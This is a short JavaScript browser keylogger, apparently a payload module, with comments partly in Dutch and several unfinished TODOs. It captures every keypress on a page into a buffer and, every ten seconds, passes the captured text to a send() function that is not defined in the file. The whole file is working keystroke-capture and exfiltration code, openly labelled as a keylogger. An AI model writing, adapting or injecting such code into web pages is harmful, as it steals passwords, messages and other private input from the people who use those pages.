var keys='';
var counter=0; 

//TODO check for duplicate
document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
	counter+=1;
	//lastpressed tijd updaten -> een constante timer checkt of het lang genoeg geleden is (1 second bv) kan setting zijn
	//TODO check if counter is to high
}
//TODO send
window.setInterval(function(){
	if (keys != ''){
		send({'data': 'Keylogger captured: "'+keys+'"'});
		keys = '';
	}
	//TODO also settings check as must have waited thislong.. or maxtime and waittime sinds last push
}, 10000);
